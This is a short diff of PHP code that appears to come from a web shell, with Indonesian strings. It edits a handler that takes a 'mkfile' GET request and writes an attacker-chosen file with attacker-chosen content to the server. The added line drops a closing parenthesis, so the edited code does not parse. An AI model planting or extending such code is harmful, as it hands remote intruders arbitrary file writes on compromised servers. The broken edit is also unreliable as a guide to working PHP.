@@ -77,7 +77,7 @@ if(isset($_GET['mkfile'])) {
 	$buat = fopen($namafile,"w");
 	fwrite($buat, $isi);
 	fclose($buat);
-	if($buat == true) {
+	if(is_file($namafile) {
 		echo "<font size='5' style='text-shadow:#19863f 0px 0px 2px'>File Sukses Dibuat!</font>";
 	} else {
 		echo "<font size='5' style='text-shadow:#19863f 0px 0px 2px'>Gagal Membuat File!</font>";
